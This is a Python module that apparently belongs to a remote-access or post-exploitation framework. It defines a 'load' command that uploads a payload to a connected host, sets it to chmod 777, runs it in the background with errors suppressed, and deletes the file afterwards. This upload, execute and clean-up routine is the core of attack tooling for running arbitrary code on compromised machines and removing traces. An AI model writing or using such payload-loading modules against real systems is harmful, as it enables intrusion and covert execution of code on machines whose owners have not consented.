#!/usr/bin/env python3

from core.badges import badges
from core.sender import sender

class UnicornModule:
    def __init__(self, unicorn_handler):
        self.sender = sender(unicorn_handler)
        self.badges = badges()

        self.name = "load"
        self.description = "Load custom payload."
        self.usage = "Usage: load <input_file> [argv]"
        self.type = "managing"
        self.args = 2

    def run(self, cmd_data):
        input_file = cmd_data.split(" ")[0]

        files = input_file + " " + input_file

        arguments = "".join(cmd_data.split(input_file)).strip()

        print(self.badges.G + "Sending payload...")

        self.sender.upload(files)
        instructions = \
        "chmod 777 ./" + input_file + ";" + \
        "./" + input_file + " " + arguments + " 2>/dev/null &;" + \
        "rm ./" + input_file + "\n"
        print(self.badges.G + "Executing payload...")

        print(self.sender.send_command(self.name, instructions))
        print(self.badges.S + "Payload executed!")